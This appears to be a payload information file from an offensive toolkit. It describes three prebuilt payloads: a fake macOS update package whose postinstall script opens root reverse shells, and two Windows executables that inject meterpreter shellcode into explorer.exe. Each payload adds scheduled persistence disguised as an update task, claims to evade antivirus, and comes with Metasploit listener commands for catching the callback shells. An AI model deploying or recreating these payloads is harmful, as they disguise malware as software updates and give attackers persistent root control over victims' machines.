
-------------------------------
----- Payload Information -----
-------------------------------

[Apple_MacOSX_Update.pkg]

- Description: This is 4 lines of BASH stuck in an apple postinstall script.
               No signature AV can ever detect this because it uses system
               mechanics and contains no binaries in the package.

- This will spawn 2 root shells to the following addresses:
	172.16.42.2 6446
	172.16.42.3 6446

- It will also add a persistent backdoor that will spawn these 2 shells
  every 3 minutes (sudo crontab -l).

- Use this in metasploit for a listener:

set PAYLOAD generic/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 6446
set ExitOnSession false
set AutoRunScript ""
exploit -j


[meterpreter_inject.exe]

- Description: This is a windows meterpreter shell that was
               encoded into base 64, embedded into a python script
               that preforms raw shellcode injection into explorer.exe,
               and then compiled into an executable. It is not detected
               at the time of this writing. If it is, recreate it.

- This will spawn 2 meterpreter shells to the following addresses:
	172.16.42.2 587
	172.16.42.3 587

- It will also add a persistent backdoor to Windows that will spawn
  these 2 shells every 3 minutes (schtasks /query /tn winupdate)

- Use this in metasploit for a listener:

set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 587
set ExitOnSession false
set EXITFUNC thread
set AutoRunScript "migrate -f"
exploit -j

[powershell-https.exe]

- Description: This is an implementation of "Invoke-Shellcode"
               from Matthew Graeber's PowerSploit modules. It
               was minified and implemented into a standalone
               python script then compiled into an executable.

- This will spawn 2 meterpreter shells to the following addresses:
        172.16.42.2 587
        172.16.42.3 587

- It will also add a persistent backdoor to Windows that will spawn
  these 2 shells every 3 minutes (schtasks /query /tn winupdate)

- Use this in metasploit for a listener:

set PAYLOAD windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 587
set SessionCommunicationTimeout 0
set ExitOnSession false
set EXITFUNC thread
set AutoRunScript ""
exploit -j


